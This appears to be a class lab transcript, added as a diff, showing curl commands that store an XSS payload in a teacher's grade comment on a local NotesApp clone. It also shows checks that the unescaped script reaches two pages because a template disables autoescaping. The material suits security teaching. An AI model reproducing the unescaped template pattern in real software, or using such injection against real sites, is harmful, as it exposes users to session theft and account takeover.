@@ -1,0 +1,23 @@
+﻿# Part 1 - curl transcript (Class 10, stored XSS)
+# host: http://127.0.0.1:8080   (local NotesApp clone, seed data)
+# templates under test: web/templates/dashboard.html:15 and teacher.html:49
+#   <td>{% autoescape false %}{{ n.comment }}{% endautoescape %}</td>
+# payload: <script>alert('XSS by Eve')</script>
+#
+# curl -c teacher.jar -d "username=prof.turing&password=teach123" \http://127.0.0.1:8080/login
+teacher login: HTTP 302
+# curl -b teacher.jar --data-urlencode note_id=1 --data-urlencode grade=16.2 --data-urlencode "comment=<payload>" \http://127.0.0.1:8080/grades
+teacher saves comment on note 1 (alice's note): HTTP 302
+# curl -c alice.jar -d "username=alice&password=alicepw" \http://127.0.0.1:8080/login
+alice login: HTTP 302
+# curl -b alice.jar \http://127.0.0.1:8080/dashboard
+alice GET /dashboard: HTTP 200
+# raw (unescaped) <script>alert('XSS by Eve')</script> in alice's page : 1
+# escaped &lt;script&gt;...&lt;/script&gt; in alice's page              : 0
+# comment cell as alice's browser receives it:
+#   <td><script>alert('XSS by Eve')</script></td>
+# curl -b teacher.jar \http://127.0.0.1:8080/teacher
+teacher GET /teacher: HTTP 200
+# raw <script> in the teacher's own grade table (same flaw, 2nd template): 1
+#
+# raw HTML kept: part1_alice_dashboard_raw.html, part1_teacher_dashboard_raw.html
